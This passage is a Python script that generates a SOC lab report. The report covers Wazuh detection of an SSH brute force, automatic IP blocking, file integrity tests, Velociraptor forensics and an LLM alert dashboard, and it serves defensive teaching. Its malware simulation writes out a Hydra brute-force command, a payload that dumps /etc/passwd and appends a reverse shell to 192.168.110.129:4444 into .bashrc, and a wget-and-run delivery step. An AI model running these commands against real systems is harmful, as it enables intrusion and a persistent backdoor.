    "Ubuntu VM (192.168.110.130). Each line shows an attempted username/password combination against the SSH service.")

doc.add_heading("6.2 Wazuh Detection — SSH Brute-Force", level=2)

doc.add_paragraph(
    "As the Hydra attack generated hundreds of failed SSH login attempts, the Wazuh agent on the Ubuntu VM "
    "forwarded authentication logs to the Wazuh Manager in real-time. The manager's correlation engine matched "
    "these events against its ruleset and triggered multiple alerts:"
)

add_table(
    ["Rule ID", "Description", "Level", "MITRE ATT&CK"],
    [
        ["5551", "Multiple failed logins in a short period", "10", "T1110 — Brute Force"],
        ["5763", "SSH brute-force attack detected", "10", "T1110.001 — Password Guessing"],
        ["5710", "Attempt to login using a non-existent user", "5", "T1078 — Valid Accounts"],
    ],
)

doc.add_paragraph()

doc.add_paragraph(
    "The Ubuntu VM's authentication logs (/var/log/auth.log) recorded every failed SSH attempt, clearly showing "
    "the brute-force pattern originating from 192.168.110.129:"
)

add_figure("ubuntu_ssh_logs",
    "Figure 6.2: Ubuntu VM authentication logs showing repeated 'Failed password' entries from "
    "192.168.110.129 (Kali VM). The rapid succession of failed attempts is the signature of a brute-force attack.")

doc.add_paragraph(
    "In the Wazuh Dashboard, the brute-force alerts were visible under the Threat Hunting module. "
    "Filtering by MITRE ATT&CK technique T1110 (Brute Force) isolated all related events:"
)

add_figure("threat_hunting_dashboard",
    "Figure 6.3: Wazuh Threat Hunting dashboard filtered by MITRE ATT&CK technique T1110 (Brute Force), "
    "showing all detected brute-force events with their timestamps, source IPs, and rule descriptions.")

add_figure("brute_force_alerts",
    "Figure 6.4: Wazuh alerts filtered for brute-force and authentication failure rules (5551, 5763), "
    "showing the concentrated burst of SSH attacks from 192.168.110.129 against the Ubuntu agent.")

doc.add_paragraph(
    "Expanding a single rule 5763 alert reveals the full event details. The Document Details panel shows "
    "the complete alert data including agent information, source IP, and the raw authentication log:"
)

add_figure("alert_expanded_top",
    "Figure 6.5: Expanded Document Details for a rule 5763 alert (top portion). Key fields: "
    "agent.id = 001, agent.ip = 192.168.110.130 (Ubuntu victim), agent.name = Ubuntu_24.04.4_LTS, "
    "data.dstuser = root, data.srcip = 192.168.110.129 (Kali attacker), data.srcport = 60792, "
    "decoder.name = sshd, and full_log showing 'Failed password for root from 192.168.110.129'.")

doc.add_paragraph(
    "Scrolling down in the Document Details reveals the rule metadata and MITRE ATT&CK mapping:"
)

add_figure("alert_expanded_mitre",
    "Figure 6.6: Expanded Document Details for rule 5763 (bottom portion). Critical fields: "
    "rule.id = 5763, rule.level = 10, rule.groups = syslog/sshd/authentication_failures, "
    "rule.mitre.id = T1110, rule.mitre.tactic = Credential Access, rule.mitre.technique = Brute Force. "
    "This confirms Wazuh correctly mapped the attack to the MITRE ATT&CK framework.")

doc.add_heading("6.3 Active Response — Automatic IP Block", level=2)

doc.add_paragraph(
    "When rule 5763 triggered, the Active Response module automatically executed the firewall-drop command "
    "on the Ubuntu agent. This added an iptables DROP rule blocking all traffic from the attacker's IP "
    "(192.168.110.129) for 600 seconds."
)

doc.add_paragraph("Verification on the Ubuntu VM confirmed the block was applied:")
add_code_block("sudo iptables -L -n | grep 192.168.110.129")

add_figure("iptables_block",
    "Figure 6.7: The iptables rules on the Ubuntu VM showing the DROP entry for 192.168.110.129 "
    "(Kali attacker). This rule was automatically inserted by Wazuh Active Response, blocking all "
    "inbound traffic from the attacker without any manual intervention.")

doc.add_paragraph(
    "This demonstrates a complete automated incident response workflow: detect the attack via log correlation, "
    "trigger an alert, and automatically remediate by blocking the attacker — all within seconds of the attack "
    "being detected."
)

doc.add_heading("6.3.1 Verifying Active Response — Attacker's Perspective", level=3)

doc.add_paragraph(
    "To conclusively prove that the Active Response mechanism is working, the SSH brute-force attack was "
    "re-launched from the Kali VM after the IP had been blocked. This time, instead of receiving "
    "'Failed password' responses (which indicate the SSH service is reachable but credentials are wrong), "
    "Hydra reported connection errors — confirming that the attacker's traffic is being dropped at the "
    "firewall level before it even reaches the SSH service."
)

doc.add_paragraph(
    "The iptables rules on the Ubuntu VM confirmed the block was active, with two DROP entries for "
    "the attacker's IP 192.168.110.129:"
)

add_figure("ar_iptables_drop",
    "Figure 6.8: Ubuntu VM iptables output (via watch command refreshing every 5 seconds) showing "
    "two DROP rules targeting 192.168.110.129 (Kali attacker). These rules were automatically "
    "inserted by Wazuh Active Response when rule 5763 triggered, blocking all inbound traffic "
    "from the attacker.")

doc.add_paragraph("The same Hydra command was executed again from Kali:")
add_code_block(
    "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.110.130"
)

doc.add_paragraph(
    "This time, the output showed a fundamentally different behavior:"
)

add_table(
    ["Scenario", "Hydra Output", "Meaning"],
    [
        ["Before Active Response", "\"[ssh] login attempt ... Failed\"", "SSH service is reachable; password is incorrect"],
        ["After Active Response", "\"[ERROR] could not connect to target port 22: Connection refused\" "
         "or \"Connection timed out\"", "Traffic is dropped by iptables before reaching SSH"],
    ],
)

doc.add_paragraph()

add_figure("ar_hydra_blocked",
    "Figure 6.9: Hydra output after Active Response blocked the attacker's IP. The first run (top) "
    "shows normal attack activity with 61 tries/min. After stopping and re-running Hydra (bottom), "
    "the output immediately shows '[ERROR] could not connect to ssh://192.168.110.130:22 — Timeout "
    "connecting to 192.168.110.130' — confirming that the iptables DROP rule is silently discarding "
    "all packets from the attacker before they reach the SSH service.")

doc.add_paragraph(
    "The shift from authentication failures to connection errors is the key evidence that Active Response "
    "is functioning correctly. When the iptables DROP rule is active, the attacker's packets are silently "
    "discarded by the kernel's netfilter framework — the SSH daemon never sees the connection attempts, "
    "and Hydra cannot even establish a TCP handshake with port 22."
)

doc.add_paragraph(
    "After the 600-second timeout expires, the iptables rule is automatically removed by Wazuh, and the "
    "attacker would once again receive 'Failed password' responses if they retry — at which point the "
    "brute-force detection cycle would repeat, blocking the IP again. This creates an effective automated "
    "defense loop that persists as long as the attacker continues their assault."
)

doc.add_heading("6.4 File Integrity Monitoring (FIM) Tests", level=2)

doc.add_paragraph(
    "To validate the FIM configuration, a series of file operations were performed on the Ubuntu VM's "
    "/home directory, which was being monitored by the Wazuh syscheck module:"
)

add_code_block(
    "# Create a test file\n"
    "touch /home/testfile.txt\n\n"
    "# Modify the file\n"
    "echo 'sensitive data' > /home/testfile.txt\n\n"
    "# Delete the file\n"
    "rm /home/testfile.txt"
)

add_figure("fim_test_commands",
    "Figure 6.10: FIM test commands executed on the Ubuntu VM — creating, modifying, and deleting "
    "files in the /home directory to trigger Wazuh file integrity alerts.")

doc.add_paragraph(
    "Within the configured scan interval (60 seconds), Wazuh detected all three operations and generated "
    "corresponding alerts:"
)

add_table(
    ["Operation", "Wazuh Event", "Rule", "Details"],
    [
        ["touch /home/testfile.txt", "File added", "554 (syscheck)", "New file detected in monitored directory"],
        ["echo 'data' > testfile.txt", "File modified", "550 (syscheck)", "Checksum changed, content altered"],
        ["rm /home/testfile.txt", "File deleted", "553 (syscheck)", "File removed from monitored directory"],
    ],
)

doc.add_paragraph()

add_figure("fim_events",
    "Figure 6.11: Wazuh FIM events page showing detected file integrity changes in the /home directory. "
    "Each event records the file path, type of change (added/modified/deleted), timestamp, and agent name.")

doc.add_paragraph(
    "Expanding a single FIM event reveals comprehensive information about the file change. The Document "
    "Details panel shows agent information, decoder type, and the raw syscheck log:"
)

add_figure("fim_expanded_top",
    "Figure 6.12: Expanded FIM Document Details (top portion). The alert shows agent.name = "
    "Ubuntu_24.04.4_LTS, decoder.name = syscheck_integrity_changed, and the full_log reads: "
    "'File /home/sudo1/.config/dconf/user modified, Mode: realtime, Changed attributes: "
    "size, inode, mtime, md5, sha1, sha256, Size changed from 5196 to 4430'.")

doc.add_paragraph(
    "Scrolling further reveals the detailed syscheck fields — before/after values for every monitored "
    "attribute including checksums, permissions, timestamps, and file ownership:"
)

add_figure("fim_expanded_mid",
    "Figure 6.13: Expanded FIM Document Details (middle portion) showing syscheck fields: "
    "syscheck.event = modified, syscheck.mode = realtime, syscheck.path = /home/sudo1/.config/dconf/user, "
    "syscheck.perm_after = rw-rw-r--, and before/after MD5 hashes confirming the file content changed. "
    "The mtime_before and mtime_after timestamps pinpoint exactly when the modification occurred.")

add_figure("fim_expanded_bottom",
    "Figure 6.14: Expanded FIM Document Details (bottom portion) showing SHA1 and SHA256 before/after "
    "hash pairs, syscheck.size_after = 4,430 (down from 5,196), syscheck.uid_after = 1000, "
    "syscheck.uname_after = sudo1. These cryptographic hashes provide forensic evidence of exactly "
    "what changed in the file.")

# ========== SECTION 6.5: MALWARE SIMULATION ==========
doc.add_heading("6.5 Malware Simulation — Post-Breach Payload Delivery", level=2)

doc.add_paragraph(
    "To satisfy the project proposal requirement of simulating malware activity, a second attack scenario "
    "was executed following the SSH brute-force attack. This scenario simulates what an attacker would do "
    "after successfully gaining access to the victim system: deliver a malicious payload, perform "
    "post-compromise reconnaissance, and establish persistence."
)

doc.add_paragraph(
    "The simulation used a shell script (malware.sh) served from the Kali attacker machine via a Python "
    "HTTP server, then downloaded and executed on the Ubuntu victim machine. This models a real-world "
    "Tactics, Techniques, and Procedures (TTP) scenario mapped to the MITRE ATT&CK framework."
)

doc.add_heading("6.5.1 Malware Delivery", level=3)

doc.add_paragraph("On the Kali VM (attacker), a simulated malware script was created and served over HTTP:")
add_code_block(
    "# Create simulated malware payload\n"
    "mkdir -p /tmp/malware-lab\n"
    "cat > /tmp/malware-lab/malware.sh << 'EOF'\n"
    "#!/bin/bash\n"
    "# Simulated post-breach malware - reconnaissance + persistence\n"
    "hostname && whoami && id\n"
    "cat /etc/passwd > /tmp/.sys_dump\n"
    "uname -a >> /tmp/.sys_dump\n"
    "echo 'nohup bash -i >& /dev/tcp/192.168.110.129/4444 0>&1 &' >> /home/sudo1/.bashrc\n"
    "EOF\n\n"
    "# Serve via HTTP\n"
    "cd /tmp/malware-lab && python3 -m http.server 8080"
)

doc.add_paragraph(
    "On the Ubuntu VM (victim, simulating post-brute-force compromise), the malware was downloaded "
    "from the attacker's HTTP server and executed:"
)
add_code_block(
    "wget http://192.168.110.129:8080/malware.sh -O /home/sudo1/malware.sh\n"
    "chmod +x /home/sudo1/malware.sh\n"
    "/home/sudo1/malware.sh"
)

add_figure("malware_delivery",
    "Figure 6.15: Malware delivery — Kali Linux HTTP server (python3 -m http.server 8080) "
    "showing a successful GET request for malware.sh from the Ubuntu victim (192.168.110.130). "
    "The 200 response at 07:50:21 confirms the payload was downloaded by the target machine.")

doc.add_heading("6.5.2 Malware Execution & Reconnaissance", level=3)

doc.add_paragraph(
    "Upon execution, the malware script performed two stages of attack activity aligned with "
    "MITRE ATT&CK techniques:"
)

for technique, desc in [
    ("Stage 1 — Reconnaissance (T1592)", "The script collected system information including hostname, "
     "current user identity, group memberships, and OS details, writing results to a hidden file "
     "(/tmp/.sys_dump) for potential exfiltration."),
    ("Stage 2 — Persistence (T1546.004)", "The script appended a reverse shell command to "
     "/home/sudo1/.bashrc — a Unix shell configuration file that executes on every user login. "
     "This establishes a backdoor that survives reboots and password changes, mapped to MITRE "
     "ATT&CK T1546.004 (Event Triggered Execution: Unix Shell Configuration Modification)."),
]:
    p = doc.add_paragraph()
    tnr(p.add_run(f"{technique} — "), bold=True)
    tnr(p.add_run(desc))

add_figure("malware_execution",
    "Figure 6.16: Malware execution on the Ubuntu VM. The script output confirms Stage 1 "
    "(reconnaissance): hostname 'sudo', user 'sudo1', uid=1000 with group memberships. "
    "Stage 2 (persistence) is confirmed by '[*] Installing persistence...' followed by "
    "'[*] Backdoor installed. Exiting.' — the reverse shell command was appended to .bashrc.")

doc.add_heading("6.5.3 Wazuh Detection — FIM Evidence", level=3)

doc.add_paragraph(
    "Wazuh's File Integrity Monitoring module, configured to monitor /home with a 60-second scan "
    "interval, detected both malicious file system changes within one scan cycle:"
)

add_table(
    ["File", "FIM Event", "Rule", "Significance"],
    [
        ["/home/sudo1/malware.sh", "File added", "554 (syscheck)", "Malware payload dropped in user home — T1105 (Ingress Tool Transfer)"],
        ["/home/sudo1/.bashrc", "File modified", "550 (syscheck)", "Persistence mechanism installed — T1546.004 (Unix Shell Config Modification)"],
    ],
)

doc.add_paragraph()
doc.add_paragraph(
    "The .bashrc modification is particularly significant from a forensic perspective: it represents "
    "a stealthy persistence mechanism that would survive system reboots. The FIM before/after hash "
    "comparison (as demonstrated in Section 6.4) provides cryptographic proof of the unauthorized "
    "modification, giving the SOC analyst irrefutable evidence for incident response and reporting."
)

doc.add_paragraph()

# ========== SECTION 6.6: VELOCIRAPTOR POST-COMPROMISE FILE INVESTIGATION ==========
doc.add_heading("6.6 Velociraptor Post-Compromise File Investigation", level=2)

doc.add_paragraph(
    "Following the malware simulation in Section 6.5, Velociraptor was used to perform a forensic "
    "investigation of the compromised Ubuntu endpoint. This demonstrates the complete SOC workflow: "
    "Wazuh detects the threat via FIM alerts, and Velociraptor is then used to conduct a deeper "
    "investigation — collecting file artifacts and examining the full extent of the compromise."
)

doc.add_heading("6.6.1 Persistence Mechanism — Active Backdoor", level=3)

doc.add_paragraph(
    "When a new terminal session was opened on the Ubuntu VM after the malware execution, the reverse "
    "shell command appended to /home/sudo1/.bashrc executed automatically — confirming that the "
    "persistence mechanism installed by malware.sh was active. The connection attempt failed only "
    "because the Kali VM had no listener on port 4444, demonstrating exactly how the backdoor would "
    "behave in a real attack if the attacker maintained a netcat listener."
)

add_figure("bashrc_backdoor_active",
    "Figure 6.17: Ubuntu VM terminal showing the reverse shell backdoor firing automatically on "
    "login. The 'bash: /dev/tcp/192.168.110.129/4444: No route to host' error confirms the "
    "persistence mechanism (T1546.004) installed by malware.sh is active — it attempts to connect "
    "back to the attacker on every bash session start. The tail -5 ~/.bashrc output shows the "
    "nohup bash -i reverse shell as the final line added by the malware.")

doc.add_heading("6.6.2 Velociraptor Bash History Collection", level=3)

doc.add_paragraph(
    "Velociraptor's Linux.Sys.BashHistory artifact was collected from the Ubuntu endpoint to examine "
    "command execution history. The collection retrieved 143 entries from /home/sudo1/.bash_history, "
    "providing a chronological record of all commands executed by the user."
)

add_figure("velo_bashhistory_results",
    "Figure 6.18: Velociraptor Linux.Sys.BashHistory collection (FlowId: F.D7QVT08U9FDTG) completed "
    "successfully with 143 rows from /home/sudo1/.bash_history. The Results tab shows entries from "
    "the OSPath /home/sudo1/.bash_history, beginning with system setup commands such as "
    "sudo vmhgfs-fuse, apt update, and open-vm-tools installation.")

doc.add_paragraph(
    "Examining the final entries in the bash history (entries 141–143) revealed that the user had "
    "run nano ~/.bashrc and source ~/.bashrc — confirming that the .bashrc file was recently edited "
    "and reloaded, consistent with the malware's persistence installation:"
)

add_figure("velo_bashhistory_last",
    "Figure 6.19: Velociraptor BashHistory results — last page (entries 141–143 of 143). "
    "The final commands show: 'nano ~/.bashrc' (the .bashrc file was opened for editing), "
    "'source ~/.bashrc' (the modified .bashrc was reloaded, triggering the backdoor), and "
    "'netbeans'. These entries corroborate the FIM alert showing .bashrc was modified and "
    "confirm the malware's persistence mechanism was installed and activated.")

doc.add_heading("6.6.3 Velociraptor Shell — Direct File Examination", level=3)

doc.add_paragraph(
    "Velociraptor's built-in Shell capability allows SOC analysts to execute commands directly on "
    "the remote endpoint without needing SSH access. This feature was used to read the last 5 lines "
    "of /home/sudo1/.bashrc, providing direct forensic evidence of the installed backdoor:"
)

add_figure("velo_shell_bashrc",
    "Figure 6.20: Velociraptor Shell tab executing 'tail -5 /home/sudo1/.bashrc' on the Ubuntu "
    "endpoint (C.9a25f3d3816b8d18). The output clearly shows the reverse shell backdoor as the "
    "final line: 'nohup bash -i >& /dev/tcp/192.168.110.129/4444 0>&1 &' — the persistence "
    "mechanism installed by malware.sh, mapped to MITRE ATT&CK T1546.004 (Unix Shell Configuration "
    "Modification). This was executed remotely via Velociraptor without any direct access to the VM.")

doc.add_paragraph(
    "This demonstration highlights a key advantage of Velociraptor in incident response: the ability "
    "to remotely examine files, execute forensic commands, and collect evidence from a compromised "
    "endpoint — all through a single centralized interface — without alerting the attacker or "
    "disrupting the running system."
)

add_table(
    ["Velociraptor Artifact", "Finding", "MITRE ATT&CK Relevance"],
    [
        ["Linux.Sys.BashHistory", "143 history entries; final entries confirm nano/.bashrc + source/.bashrc",
         "T1059.004 — Unix Shell command execution history"],
        ["Shell: tail -5 /home/sudo1/.bashrc", "Reverse shell backdoor confirmed in .bashrc",
         "T1546.004 — Unix Shell Configuration Modification (Persistence)"],
    ],
)

doc.add_paragraph()

doc.add_page_break()

# ========== SECTION 7: AI-POWERED ALERT ANALYSIS ==========
doc.add_heading("7. AI-Powered Alert Analysis", level=1)

doc.add_heading("7.1 Overview", level=2)

doc.add_paragraph(
    "A key innovation in this project is the custom-built SOC Dashboard — a web application that pulls live "
    "security alerts from the Wazuh Indexer and uses a large language model (LLM) to provide automated threat "
    "analysis. This simulates a junior SOC analyst's workflow: review alerts, assess severity, map to MITRE "
    "ATT&CK, and recommend response actions."
)

doc.add_paragraph("The dashboard stack consists of:")
for component, desc in [
    ("Flask (Python)", "Web framework serving the dashboard UI and API endpoints"),
    ("Wazuh Indexer (OpenSearch)", "Data source — stores all security alerts on port 9200"),
    ("Groq API", "Free, fast LLM inference service providing access to Llama 3.3 70B"),
    ("Llama 3.3 70B", "Large language model used for alert analysis and threat assessment"),
]:
    p = doc.add_paragraph()
    tnr(p.add_run(f"{component} — "), bold=True)
    tnr(p.add_run(desc))

doc.add_heading("7.2 Architecture & Data Flow", level=2)

doc.add_paragraph("The data flow through the SOC Dashboard follows this path:")
for i, step in enumerate([
    "User opens the dashboard at localhost:5000",
    "Flask backend queries the Wazuh Indexer (port 9200) for recent alerts via OpenSearch REST API",
    "Alerts are displayed in real-time on the dashboard (auto-refreshes every 30 seconds)",
    "User clicks 'Analyze Alerts' to trigger AI analysis",
    "Backend pulls the 15 highest-severity alerts and 10 FIM events from the last 7 days",
    "Alert data is formatted into a structured prompt and sent to Groq's API",
    "Llama 3.3 70B generates a comprehensive security assessment",
    "The AI response is rendered as formatted markdown in the dashboard",
], 1):
    doc.add_paragraph(f"{i}. {step}")

add_figure("workflow_soc_dashboard",
    "Figure 7.x: SOC Dashboard Data Flow — sequence diagram showing the complete pipeline from "
    "the SOC analyst opening the dashboard, through Flask querying the Wazuh Indexer (OpenSearch), "
    "real-time alert display with 30-second auto-refresh, AI analysis triggered by the user, "
    "prompt construction and submission to Groq's Llama 3.3 70B, and the rendered markdown response.")

doc.add_heading("7.3 Key Code — Alert Fetching", level=2)

doc.add_paragraph(
    "The dashboard connects to the Wazuh Indexer using the OpenSearch REST API with basic authentication. "
    "The following code shows how security alerts are queried:"
)

add_code_block(
    'def indexer_search(query_body, index="wazuh-alerts-*", size=30):\n'
    '    """Query the Wazuh Indexer (OpenSearch) for security alerts."""\n'
    '    resp = requests.post(\n'
    '        f"{INDEXER_BASE}/{index}/_search",\n'
    '        auth=(INDEXER_USER, INDEXER_PASS),\n'
    '        json={"size": size, **query_body},\n'
    '        verify=False, timeout=15,\n'
    '    )\n'
    '    return resp.json()'
)

doc.add_heading("7.4 Key Code — AI Analysis", level=2)

doc.add_paragraph(
    "When the user clicks 'Analyze Alerts', the backend constructs a prompt containing the most recent "
    "high-severity alerts and FIM events, then sends it to Groq for analysis:"
)

add_code_block(
    'def ai_generate(prompt, max_tokens=1024):\n'
    '    """Generate response using Groq (free, fast LLM inference)."""\n'
    '    client = Groq(api_key=GROQ_API_KEY)\n'
    '    chat = client.chat.completions.create(\n'
    '        model="llama-3.3-70b-versatile",\n'
    '        messages=[{"role": "user", "content": prompt}],\n'
    '        max_tokens=max_tokens,\n'
    '        temperature=0.3,\n'
    '    )\n'
    '    return chat.choices[0].message.content'
)

doc.add_paragraph(
    "The AI prompt instructs the model to act as a SOC analyst and provide: an executive summary, critical "
    "findings, per-attack analysis with MITRE ATT&CK mappings, file integrity assessment, and actionable "
    "recommendations."
)

doc.add_heading("7.5 Dashboard Interface", level=2)

doc.add_paragraph(
    "The SOC Dashboard features a modern dark-themed interface with real-time data panels:"
)

for panel, desc in [
    ("Stats Bar", "Total alerts (2,646), active agents (2), authentication failures, and FIM event counts (122)"),
    ("Recent Security Alerts", "Live table of alerts sorted by time with severity badges (Medium, High, Critical)"),
    ("Agents Panel", "Connected endpoint status — wazuh.manager (active), Ubuntu_24.04.4_LTS (active), Windows_11 (disconnected)"),
    ("File Integrity Events", "Real-time FIM changes with color-coded event types (added/modified/deleted)"),
    ("AI Analysis Panel", "One-click AI assessment powered by Llama 3.3 70B with follow-up question support"),
]:
    p = doc.add_paragraph()
    tnr(p.add_run(f"{panel} — "), bold=True)
    tnr(p.add_run(desc))

add_figure("soc_dashboard_live",
    "Figure 7.1: SOC Dashboard main view connected to the live Wazuh instance. The stats bar shows "
    "2,646 total alerts, 2 active agents, and 122 FIM events. The Agents panel displays wazuh.manager "
    "and Ubuntu_24.04.4_LTS as active, with Windows_11 disconnected. Recent alerts show Systemd service "
    "failure events (rule 40704) at Medium severity.")

doc.add_heading("7.6 AI Analysis Results", level=2)

doc.add_paragraph(
    "After clicking 'Analyze Alerts', the Llama 3.3 70B model processes the alert data and returns "
    "a structured security assessment. The AI output is organized into clear sections:"
)

p = doc.add_paragraph()
tnr(p.add_run("Executive Summary & Critical Findings:"), bold=True)

doc.add_paragraph(
    "The AI immediately identified a potential brute-force attack on the SSH service from IP address "
    "192.168.110.129, noting multiple failed login attempts triggering rule_id 5763. It also flagged "
    "PAM multiple failed logins (rule_id 5551) and several file integrity events."
)

add_figure("ai_exec_summary",
    "Figure 7.2: AI Analysis output — Executive Summary and Critical Findings. The AI identifies "
    "the brute-force attack from 192.168.110.129 targeting the root user, PAM multiple failed logins "
    "(rule_id 5551), and file integrity events (rule_id 550, 553). The analysis is rendered as "
    "formatted markdown in the dashboard.")

p = doc.add_paragraph()
tnr(p.add_run("Attack Analysis:"), bold=True)

doc.add_paragraph(
    "The AI broke down each attack type with source/target details, MITRE ATT&CK mapping, and "
    "severity assessment:"
)

add_figure("ai_attack_analysis",
    "Figure 7.3: AI Analysis output — Attack Analysis section. The Brute Force Attack on SSH "
    "is detailed: multiple failed SSH login attempts from 192.168.110.129 targeting the root user "
    "on Ubuntu 24.04.4 LTS, mapped to MITRE ATT&CK 'Brute Force' technique (T1110), assessed as "
    "high severity. PAM Multiple Failed Logins from the same source IP are also analyzed.")

p = doc.add_paragraph()
tnr(p.add_run("File Integrity Analysis & Recommendations:"), bold=True)

doc.add_paragraph(
    "The AI identified file modifications and deletions that could indicate malicious activity, "
    "and provided specific, actionable recommendations:"
)

add_figure("ai_file_integrity",
    "Figure 7.4: AI Analysis output — File Integrity section listing modified/deleted files "
    "including /home/sudo1/.config/dconf/user, /home/sudo1/.local/share/gnome-shell/application_state, "
    "and /etc/velociraptor.writeback.yaml.bak. The Recommendations section begins with 'Block the "
    "Source IP: Immediately block 192.168.110.129 at the firewall level'.")

add_figure("ai_recommendations",
    "Figure 7.5: AI Analysis output — Full Recommendations section. Six actionable steps: "
    "(1) Block the Source IP 192.168.110.129, (2) Review SSH Configuration — disable root login "
    "and use key-based auth, (3) Investigate File Changes, (4) Implement Rate Limiting for SSH, "
    "(5) Monitor System Logs closely, (6) Consider Multi-Factor Authentication (MFA).")

doc.add_heading("7.7 Follow-Up Questions", level=2)

doc.add_paragraph(
    "The dashboard supports interactive follow-up questions. The SOC analyst can type a question "
    "in the chat input box, and the AI responds with additional context based on the alert data. "
    "This feature enables deeper investigation without leaving the dashboard."
)

doc.add_paragraph(
    'Example question: "What specific MITRE ATT&CK techniques were used in this attack?"'
)

add_figure("ai_followup_top",
    "Figure 7.6: Follow-up question and AI response. The user asked 'What specific MITRE ATT&CK "
    "techniques were used in this attack?' and the AI identified five potential techniques: "
    "T1055 (Privilege Escalation), T1068 (Exploitation for Privilege Escalation), "
    "T1070 (Indicator Removal on Host), T1082 (System Information Discovery), and "
    "T1098 (Account Manipulation) — each linked to specific alert evidence.")

add_figure("ai_followup_bottom",
    "Figure 7.7: Follow-up response continued — showing the Limitations caveat (inferences based on "
    "available data) and additional Recommendations: collect more log data, conduct thorough review "
    "of system configurations, and implement privilege escalation detection and file integrity monitoring.")

doc.add_heading("7.8 AI Analysis Summary", level=2)

doc.add_paragraph(
    "The AI analysis correctly identified the following from the live alert data:"
)

for finding in [
    "SSH brute-force attack from 192.168.110.129 targeting the root user — mapped to MITRE ATT&CK T1110 (Brute Force)",
    "Multiple PAM authentication failure patterns (rule 5551) consistent with automated password guessing tools",
    "File integrity changes in /home/sudo1/ directory including configuration files and application state",
    "Recommended immediate actions: block attacker IP at firewall, review SSH configuration, investigate file changes",
    "Recommended long-term improvements: implement MFA, enable rate limiting, disable root SSH login, use key-based authentication",
    "Follow-up analysis identified additional potential techniques: T1055, T1068, T1070, T1082, T1098",
]:
    doc.add_paragraph(f"\u2022 {finding}")

doc.add_paragraph(
    "The AI's ability to correlate multiple alert types, identify attack patterns, provide MITRE ATT&CK "
    "context, and respond to follow-up questions demonstrates the value of LLM-assisted security analysis "
    "in augmenting human SOC analysts."
)

doc.add_page_break()

# ========== SECTION 8: RESULTS & FINDINGS ==========
doc.add_heading("8. Results & Findings", level=1)

doc.add_paragraph(
    "This section summarizes all security events detected during the lab exercise and the effectiveness "
    "of each monitoring component."
)

doc.add_heading("8.1 Detection Summary", level=2)

add_table(
    ["Detection Type", "Tool", "Rule/Method", "Source IP", "Target", "Result"],
    [
        ["SSH Brute-Force", "Wazuh SIEM", "Rule 5763", "192.168.110.129", "192.168.110.130", "Detected + Auto-blocked"],
        ["Multiple Auth Failures", "Wazuh SIEM", "Rule 5551", "192.168.110.129", "192.168.110.130", "Detected"],
        ["Non-existent User Login", "Wazuh SIEM", "Rule 5710", "192.168.110.129", "192.168.110.130", "Detected"],
        ["File Created (/home)", "Wazuh FIM", "Syscheck 554", "Local", "192.168.110.130", "Detected"],
        ["File Modified (/home)", "Wazuh FIM", "Syscheck 550", "Local", "192.168.110.130", "Detected"],
        ["File Deleted (/home)", "Wazuh FIM", "Syscheck 553", "Local", "192.168.110.130", "Detected"],
        ["Malware Payload Drop", "Wazuh FIM", "Syscheck 554", "192.168.110.129", "192.168.110.130", "Detected"],
        [".bashrc Persistence", "Wazuh FIM", "Syscheck 550", "192.168.110.129", "192.168.110.130", "Detected"],
        ["Active Response (IP Block)", "Wazuh AR", "firewall-drop", "N/A", "192.168.110.129", "Blocked 600s"],
        ["Login History Forensics", "Velociraptor", "Linux.Sys.LastUserLogin", "N/A", "192.168.110.130", "Collected"],
        ["Process Listing", "Velociraptor", "Linux.Sys.Pslist", "N/A", "192.168.110.130", "Collected"],
        ["Bash History Collection", "Velociraptor", "Linux.Sys.BashHistory", "N/A", "192.168.110.130", "143 entries collected"],
        [".bashrc Backdoor Confirmed", "Velociraptor Shell", "tail -5 /home/sudo1/.bashrc", "N/A", "192.168.110.130", "Reverse shell confirmed"],
        ["AI Threat Assessment", "SOC Dashboard", "Llama 3.3 70B", "N/A", "All alerts", "Analyzed"],
    ],
)

doc.add_paragraph()

doc.add_heading("8.2 MITRE ATT&CK Mapping", level=2)

doc.add_paragraph(
    "The following MITRE ATT&CK techniques were identified during the attack simulation, both by Wazuh's "
    "built-in mapping and the AI analysis:"
)

add_table(
    ["Technique ID", "Technique Name", "Tactic", "Evidence"],
    [
        ["T1110", "Brute Force", "Credential Access", "Hydra SSH attack — hundreds of failed login attempts"],
        ["T1110.001", "Password Guessing", "Credential Access", "Dictionary attack using rockyou.txt wordlist"],
        ["T1078", "Valid Accounts", "Initial Access", "Attempts to authenticate with non-existent users"],
        ["T1105", "Ingress Tool Transfer", "Command & Control", "malware.sh downloaded from Kali HTTP server to Ubuntu /home"],
        ["T1592", "Gather Victim Host Information", "Reconnaissance", "Malware collected hostname, user ID, OS info to /tmp/.sys_dump"],
        ["T1546.004", "Unix Shell Config Modification", "Persistence", "Reverse shell appended to /home/sudo1/.bashrc — detected by FIM"],
        ["T1565.001", "Stored Data Manipulation", "Impact", "FIM detected file modifications in /home"],
        ["T1059.004", "Unix Shell — Command Execution", "Execution", "Bash history (143 entries) collected via Velociraptor confirming attacker command execution"],
    ],
)

doc.add_paragraph()

doc.add_heading("8.3 Project Proposal Outcomes — Achievement Summary", level=2)

doc.add_paragraph(
    "The following table maps each expected outcome from the internship proposal to the corresponding "
    "evidence in this report, confirming all objectives were met:"
)

add_table(
    ["Proposed Outcome", "Status", "Evidence"],
    [
        ["Deploy a functional Wazuh SIEM server for centralized log monitoring and threat detection",
         "Achieved", "Sections 3–4: Wazuh deployed on Linode VPS via Docker; 2 agents registered; 2,646+ alerts collected"],
        ["Integrate Velociraptor to support endpoint forensic investigation during security incidents",
         "Achieved", "Section 5: Velociraptor server + client deployed; LastUserLogin (39 rows) and Pslist (369 rows) collected"],
        ["Implement an AI-assisted alert analysis component to help analyze and summarize security alerts",
         "Achieved", "Section 7: Flask + Groq/Llama 3.3 70B dashboard with live alert analysis, MITRE mapping, and follow-up Q&A"],
        ["Improve detection and investigation of common attacks — brute-force, malware activity, unauthorized changes",
         "Achieved", "Section 6: Hydra SSH brute-force (rules 5763/5551/5710) + malware simulation (T1105/T1546.004) + FIM tests"],
        ["Demonstrate an improved SOC workflow for monitoring, investigation, and incident response",
         "Achieved", "Workflow diagrams in Sections 4.6 and 7.2; end-to-end pipeline from attack detection to AI analysis demonstrated"],
    ],
)

doc.add_paragraph()

doc.add_heading("8.4 Key Findings", level=2)

findings = [
    ("Detection Speed", "Wazuh detected the brute-force attack within seconds of the first failed login attempts. "
     "The correlation engine aggregated individual failures and triggered rule 5763 promptly."),
    ("Automated Response", "Active Response successfully blocked the attacker's IP via iptables within seconds of "
     "the rule triggering, demonstrating effective automated remediation without human intervention."),
    ("FIM Accuracy", "All three file operations (create, modify, delete) in the /home directory were detected and "
